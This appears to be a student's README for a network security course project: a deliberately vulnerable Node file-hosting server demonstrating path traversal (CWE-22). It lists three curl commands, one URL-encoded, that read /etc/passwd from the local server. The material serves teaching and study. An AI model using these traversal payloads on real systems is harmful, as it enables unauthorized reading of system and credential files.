# A01:2021-Broken Access Control - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

The following codebase is a webserver(file hosting) built on Node that is vulnerable to **Path Traversal** attacks. Use the following commands for the attack:

```bash
curl --path-as-is "http://localhost:3000/../../../../../../../../../etc/passwd"

curl --path-as-is "http://localhost:3000/?file=/../../../../../../../../../etc/passwd"

curl --path-as-is "http://localhost:3000/?file=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```

## Student Details:

Name: Suhas K S

Roll No.: 181CO253

Reg No.: 181486

## Course Details:

Course: Network Security

Course Code: CS463

Course Instructor: Prof. Mahendra Pratap Singh
